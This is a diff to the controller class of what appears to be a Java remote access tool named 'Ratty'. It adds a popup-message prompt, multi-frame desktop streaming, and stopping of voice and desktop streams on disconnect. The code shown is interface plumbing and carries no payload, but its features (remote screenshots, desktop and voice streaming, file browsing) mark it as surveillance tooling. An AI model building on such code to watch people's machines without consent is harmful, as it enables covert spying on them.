@@ -75,7 +75,11 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 		IPacket packet = null;
 		
 		if (command == RattyGui.POPUP) {
-			packet = PopupPacket.create();
+			final String input = JOptionPane.showInputDialog(null);
+			
+			if (input != null) {
+				packet = new PopupPacket(input);
+			}
 		} else if (command == RattyGui.FREE) {
 			packet = new FreePacket();
 		} else if (command == RattyGui.SCREENSHOT) {
@@ -164,13 +168,13 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 	}
 	
 	private void handle(final ServerClient serverClient, final DesktopStreamPacket packet) {
-		final IFrame frame = packet.getFrame();
+		final IFrame[] frames = packet.getFrames();
 		final int screenWidth = packet.getScreenWidth();
 		final int screenHeight = packet.getScreenHeight();
 		final DesktopStreamPacket request = new DesktopStreamPacket();
 		final DisplayPanel displayPanel = serverClient.getDisplayPanel();
 		
-		displayPanel.showFrame(frame, screenWidth, screenHeight);
+		displayPanel.showFrames(frames, screenWidth, screenHeight);
 		
 		serverClient.client.addPacket(request);
 	}
@@ -249,6 +253,7 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 		final FileTreePanel treePanel = serverClient.getTreePanel();
 		
 		serverClient.setStreamingDesktop(false);
+		serverClient.setStreamingVoice(false);
 		serverClient.setController(null);
 		
 		client.setObserver(null);
@@ -300,6 +305,10 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 			
 			serverClient.setStreamingVoice(!streaming);
 			gui.updateTable();
+		} else if (command == RattyGui.FREE) {
+			serverClient.setStreamingDesktop(false);
+			serverClient.setStreamingVoice(false);
+			serverClient.setController(null);
 		}
 	}
 	
